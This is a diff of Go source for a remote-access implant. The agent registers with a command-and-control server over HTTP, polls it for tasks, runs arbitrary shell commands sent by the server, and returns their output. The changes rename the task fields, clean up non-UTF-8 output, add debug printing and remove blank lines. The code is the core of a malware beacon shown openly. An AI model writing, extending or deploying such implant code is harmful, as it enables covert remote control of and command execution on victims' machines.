@@ -25,8 +25,8 @@ type Agent struct {
 
 type Task struct {
 	Action string `json:"action"`
-	Command string `json:"command"`
-	Filename string `json:"filename"`
+	Input string `json:"input"`
+	Input2 string `json:"input2"`
 	TaskID json.Number `json:"task_id"`
 }
 
@@ -68,12 +68,10 @@ func (agent *Agent) Register() error {
 		"os": runtime.GOOS,
 		"implant_type": "Go",
     }
-
     jsonData, err := json.Marshal(data)
     if err != nil {
         return fmt.Errorf("failed to marshal JSON: %w", err)
     }
-
     req, err := http.NewRequest("POST", fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort), bytes.NewBuffer(jsonData))
     if err != nil {
         return fmt.Errorf("failed to create request: %w", err)
@@ -89,7 +87,6 @@ func (agent *Agent) Register() error {
     if resp.StatusCode != 201 && resp.StatusCode != 200 {
         return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
     }
-
     return nil
 }
 
@@ -100,10 +97,10 @@ func (agent *Agent) HandleTask(task Task) (Result, error) {
 
 	switch task.Action {
 	case "command":
-		cmd := execCommand(task.Command)
+		cmd := execCommand(task.Input)
 		out, err := cmd.CombinedOutput()
 		if err != nil {
-			result.Result = string(out)
+			result.Result = string(bytes.ToValidUTF8(out, []byte("?")))
 			result.ReturnCode = cmd.ProcessState.ExitCode()
 		} else {
 			result.Result = string(out)
@@ -116,7 +113,9 @@ func (agent *Agent) HandleTask(task Task) (Result, error) {
 	default:
 		return result, fmt.Errorf("Undefined action in JSON: %s", task.Action)
 	}
-
+	if agent.Debug{
+		fmt.Printf("Result: %s",result)
+	}
 	return result, nil
 }
 
@@ -188,13 +187,10 @@ func main(){
 			agent.Sleep()
 			continue
 		}
-		
-
 		if resp.StatusCode == 418 {
             agent.Register()
             continue
         }
-
         if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
 			if agent.Debug{
 				fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
